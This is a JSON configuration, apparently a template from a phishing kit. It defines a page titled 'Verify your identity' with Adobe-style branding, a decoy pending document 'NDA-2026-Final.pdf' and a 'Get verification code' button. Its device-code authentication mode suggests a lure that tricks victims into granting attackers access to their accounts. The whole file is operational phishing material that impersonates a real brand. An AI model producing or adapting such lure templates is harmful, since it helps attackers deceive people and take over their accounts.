{
  "name": "Adobe 3",
  "preload": true,
  "auth_mode": "devicecode",
  "fields": [
    {
      "key": "title",
      "label": "Page Title",
      "type": "text",
      "default": "Verify your identity"
    },
    {
      "key": "message",
      "label": "Page Message",
      "type": "text",
      "default": "Generate a one-time passcode to securely access and sign your pending document."
    },
    {
      "key": "button_text",
      "label": "Button Text",
      "type": "text",
      "default": "Get verification code"
    },
    {
      "key": "file_name",
      "label": "File Name",
      "type": "text",
      "default": "NDA-2026-Final.pdf"
    },
    {
      "key": "pages",
      "label": "Pages",
      "type": "number",
      "default": 4
    }
  ],
  "background": {
    "default": "adobe_bg.jpg",
    "editable": true,
    "blur": true
  }
}
